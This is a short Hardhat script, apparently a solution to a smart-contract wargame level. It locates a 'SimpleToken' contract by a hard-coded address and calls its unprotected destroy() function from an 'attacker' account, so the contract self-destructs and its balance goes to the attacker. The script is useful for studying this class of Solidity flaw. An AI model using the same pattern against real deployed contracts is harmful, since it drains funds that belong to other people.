const hre = require("hardhat");
require("dotenv").config();

/**
 * We got the contract address via looking at the block explorer ;)
 * 
 * The real way to find the contract address would be to hash the 
 * contract/account address, and the nonce:
 * keccak256(address, nonce)
 */

async function main() {
  // Setup accounts
  [attacker] = await ethers.getSigners();

  const TOKEN_ADDRESS = "0x5501952560B29738b65fCa1B7c7d02eFF825d0fa";

  // Fetch instance contract
  const token = await hre.ethers.getContractAt("SimpleToken", TOKEN_ADDRESS);
  console.log(`Token contract fetched at ${token.address}`);

  // Destroy token contract
  await (await token.connect(attacker).destroy(attacker.address)).wait();

  console.log(`Attack successfull?`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});